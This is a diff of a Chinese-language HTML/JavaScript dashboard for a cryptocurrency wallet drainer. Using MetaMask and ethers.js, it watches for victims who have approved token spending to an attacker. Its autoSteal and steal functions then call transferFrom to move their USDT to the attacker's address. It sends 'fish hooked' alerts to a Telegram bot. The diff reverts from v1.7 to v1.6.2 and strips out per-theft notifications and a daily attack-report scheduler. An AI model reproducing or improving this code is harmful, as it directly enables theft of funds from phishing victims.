@@ -1,8 +1,9 @@
+1.6.2 暫存
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🌟 EOA 控制台 v1.7（攻擊通知 + 每日報表）</title>
+  <title>🌟 EOA 控制台 v1.6.2➟確認按鍵 + 新授權提示 + Telegram</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -21,7 +22,7 @@
   </style>
 </head>
 <body>
-  <h2>🌟 EOA 控制台 v1.7（攻擊通知 + 每日報表）</h2>
+  <h2>🌟 EOA 控制台 v1.6.2➟確認按鍵 + 新授權提示 + Telegram</h2>
   <p><b>目前登入帳號：</b><span id="account">--</span></p>
   <button onclick="connect()">🔑 點我登入 MetaMask</button>
   <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
@@ -63,7 +64,6 @@
     let autoEnabled = false;
     const attackedSet = new Set();
     const knownApprovals = new Set();
-    const todayRecords = [];
 
     async function connect() {
       provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -80,7 +80,6 @@
         fetchApprovals();
         updateMyBalance();
       }, 10000);
-      scheduleDailyReport();
     }
 
     function toggleAuto() {
@@ -123,13 +122,14 @@
 
         if (autoEnabled) await autoSteal(owner);
       }
+
       document.getElementById("refresh").innerText = new Date().toLocaleTimeString();
     }
 
     async function notifyNewApproval(addr) {
       document.getElementById("notify").innerText = `🆒 新授權地址：${addr}`;
       const text = `🐟 上魚\n👤 地址：${addr}\n🕐 時間：${new Date().toLocaleString()}\n✅ 已授權給攻擊者`;
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
@@ -145,58 +145,14 @@
       if (amount.isZero()) return;
       const tx = await contract.transferFrom(victim, attacker, amount);
       totalStolen = totalStolen.add(amount);
-
-      const formatted = ethers.utils.formatUnits(amount, 6);
       document.getElementById("total").innerText = ethers.utils.formatUnits(totalStolen, 6) + " USDT";
-      document.getElementById("status").innerHTML = `✅ TX Hash: <a href="https://etherscan.io/tx/${tx.hash}" target="_blank">${tx.hash}</a>`;
+      document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
       const row = document.getElementById(`status-${victim}`);
       if (row) {
-        row.innerText = `✅ 成功 (${formatted} USDT)`;
+        row.innerText = "✅ 已攻擊";
         row.className = "ok";
       }
       attackedSet.add(victim);
-
-      todayRecords.push({
-        addr: victim,
-        time: new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" }),
-        amount: formatted,
-        tx: tx.hash
-      });
-
-      const total = ethers.utils.formatUnits(totalStolen, 6);
-      const msg = `☑️攻擊完成\n👤 地址：${victim}\n🕐 時間：${todayRecords[todayRecords.length-1].time}\n💰 金額：${formatted} USDT\n📈 今日總額：${total} USDT\n🔗 https://etherscan.io/tx/${tx.hash}`;
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
-      });
-    }
-
-    function scheduleDailyReport() {
-      const now = new Date();
-      const next = new Date(now);
-      next.setHours(24, 0, 0, 0);
-      const delay = next.getTime() - now.getTime();
-      setTimeout(() => {
-        sendDailyReport();
-        setInterval(sendDailyReport, 24 * 60 * 60 * 1000);
-      }, delay);
-    }
-
-    async function sendDailyReport() {
-      const today = new Date().toLocaleDateString("zh-TW", { timeZone: "Asia/Taipei" });
-      let total = 0;
-      const lines = todayRecords.map((r, i) => {
-        total += parseFloat(r.amount);
-        return `${i + 1}️⃣\n👤 地址：${r.addr}\n🕐 時間：${r.time}\n💰 金額：${r.amount} USDT\n🔗 https://etherscan.io/tx/${r.tx}`;
-      });
-      const report = `📊 每日攻擊報表（${today}）\n\n📈 攻擊總筆數：${todayRecords.length} 筆\n💰 今日總金額：${total.toFixed(3)} USDT\n\n📄 攻擊明細：\n${lines.join("\n\n")}\n\n📅 報表時間區間：${today} 00:00 ~ 23:59（UTC+8）`;
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: report })
-      });
-      todayRecords.length = 0; // reset
     }
 
     async function steal() {
